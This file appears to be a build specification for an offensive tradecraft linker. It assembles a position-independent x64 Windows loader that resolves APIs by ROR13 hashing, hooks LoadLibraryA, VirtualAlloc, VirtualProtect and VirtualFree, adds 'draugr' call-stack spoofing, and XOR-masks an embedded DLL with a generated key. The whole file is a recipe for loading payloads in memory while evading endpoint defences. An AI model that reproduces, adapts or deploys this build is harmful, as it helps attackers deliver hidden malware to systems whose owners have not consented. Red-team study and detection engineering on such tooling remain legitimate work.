x64:
    load "bin/loader.x64.o"
        make pic +gofirst +optimize +disco
    
    # merge services
    load "bin/services.x64.o"
        merge

    dfr "resolve" "ror13"
    mergelib "../libtcg.x64.zip"

    # merge hooks into the loader
    load "bin/hooks.x64.o"
        merge

    # merge call stack spoofing into the loader
    load "bin/spoof.x64.o"
        merge

    # load the stack spoofing assembly
    load "bin/draugr.x64.bin"
        linkfunc "draugr_stub"

    # hook functions that the loader uses
    attach "KERNEL32$LoadLibraryA"    "_LoadLibraryA"
    attach "KERNEL32$VirtualAlloc"    "_VirtualAlloc"
    attach "KERNEL32$VirtualProtect"  "_VirtualProtect"
    attach "KERNEL32$VirtualFree"     "_VirtualFree"

    # mask & link the dll
    generate $MASK 128
    
    push $DLL
        xor $MASK
        preplen
        link "dll"

    push $MASK
        preplen
        link "mask"

    # now get the tradecraft as a PICO
    run "pico.spec"
        link "pico"

    export